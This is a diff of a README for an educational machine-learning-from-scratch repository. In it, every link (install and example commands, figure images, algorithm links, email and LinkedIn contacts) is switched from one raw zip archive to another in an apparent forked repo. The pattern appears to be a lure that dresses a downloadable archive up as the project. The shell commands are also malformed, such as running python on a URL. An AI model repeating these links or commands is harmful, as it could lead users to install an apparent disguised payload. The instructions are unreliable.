@@ -29,16 +29,16 @@ but rather to present the inner workings of them in a transparent and accessible
   * [Contact](#contact)
 
 ## Installation
-    $ git clone https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ git clone https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
     $ cd ML-From-Scratch
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip install
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip install
 
 ## Examples
 ### Polynomial Regression
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640"\>
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640"\>
 </p>
 <p align="center">
     Figure: Training progress of a regularized polynomial regression model fitting <br>
@@ -46,7 +46,7 @@ but rather to present the inner workings of them in a transparent and accessible
 </p>
 
 ### Classification With CNN
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
     +---------+
     | ConvNet |
@@ -77,24 +77,24 @@ but rather to present the inner workings of them in a transparent and accessible
     Accuracy: 0.987465181058
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Classification of the digit dataset using CNN.
 </p>
 
 ### Density-Based Clustering
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Clustering of the moons dataset using DBSCAN.
 </p>
 
 ### Generating Handwritten Digits
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
     +-----------+
     | Generator |
@@ -137,7 +137,7 @@ but rather to present the inner workings of them in a transparent and accessible
 
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Training progress of a Generative Adversarial Network generating <br>
@@ -145,7 +145,7 @@ but rather to present the inner workings of them in a transparent and accessible
 </p>
 
 ### Deep Reinforcement Learning
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
     +----------------+
     | Deep Q-Network |
@@ -161,17 +161,17 @@ but rather to present the inner workings of them in a transparent and accessible
     Total Parameters: 450
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Deep Q-Network solution to the CartPole-v1 environment in OpenAI gym.
 </p>
 
 ### Image Reconstruction With RBM
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Shows how the network gets better during training at reconstructing <br>
@@ -179,7 +179,7 @@ but rather to present the inner workings of them in a transparent and accessible
 </p>
 
 ### Evolutionary Evolved Neural Network
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
     +---------------+
     | Model Summary |
@@ -206,7 +206,7 @@ but rather to present the inner workings of them in a transparent and accessible
     Test set accuracy: 96.7%
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
+    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip" width="640">
 </p>
 <p align="center">
     Figure: Classification of the digit dataset by a neural network which has<br>
@@ -214,7 +214,7 @@ but rather to present the inner workings of them in a transparent and accessible
 </p>
 
 ### Genetic Algorithm
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
 
     +--------+
     |   GA   |
@@ -244,7 +244,7 @@ but rather to present the inner workings of them in a transparent and accessible
     [294 Answer: 'Genetic Algorithm']
 
 ### Association Analysis
-    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
+    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip
     +-------------+
     |   Apriori   |
     +-------------+
@@ -268,47 +268,47 @@ but rather to present the inner workings of them in a transparent and accessible
 
 ## Implementations
 ### Supervised Learning
-- [Adaboost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Bayesian Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Decision Tree](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Elastic Net](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Gradient Boosting](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [K Nearest Neighbors](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Lasso Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Linear Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Logistic Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Multi-class Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Naive Bayes](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Neuroevolution](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Particle Swarm Optimization of Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Polynomial Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Random Forest](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Ridge Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Support Vector Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [XGBoost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
+- [Adaboost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Bayesian Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Decision Tree](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Elastic Net](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Gradient Boosting](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [K Nearest Neighbors](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Lasso Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Linear Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Logistic Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Multi-class Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Naive Bayes](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Neuroevolution](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Particle Swarm Optimization of Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Polynomial Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Random Forest](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Ridge Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Support Vector Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [XGBoost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
 
 ### Unsupervised Learning
-- [Apriori](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Autoencoder](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [DBSCAN](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [FP-Growth](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Gaussian Mixture Model](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Generative Adversarial Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Genetic Algorithm](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [K-Means](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Partitioning Around Medoids](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Principal Component Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-- [Restricted Boltzmann Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
+- [Apriori](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Autoencoder](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [DBSCAN](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [FP-Growth](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Gaussian Mixture Model](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Generative Adversarial Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Genetic Algorithm](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [K-Means](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Partitioning Around Medoids](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Principal Component Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+- [Restricted Boltzmann Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
 
 ### Reinforcement Learning
-- [Deep Q-Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
+- [Deep Q-Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
 
 ### Deep Learning
-  + [Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-  + [Layers](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
+  + [Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+  + [Layers](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
     * Activation Layer
     * Average Pooling Layer
     * Batch Normalization Layer
@@ -323,10 +323,10 @@ but rather to present the inner workings of them in a transparent and accessible
     * Up Sampling Layer
     * Zero Padding Layer
   + Model Types
-    * [Convolutional Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-    * [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
-    * [Recurrent Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
+    * [Convolutional Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+    * [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
+    * [Recurrent Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip)
 
 ## Contact
 If there's some implementation you would like to see here or if you're just feeling social,
-feel free to [email](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip) me or connect with me on [LinkedIn](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip).
+feel free to [email](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip) me or connect with me on [LinkedIn](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/utils/From_M_Scratch_v3.7.zip).
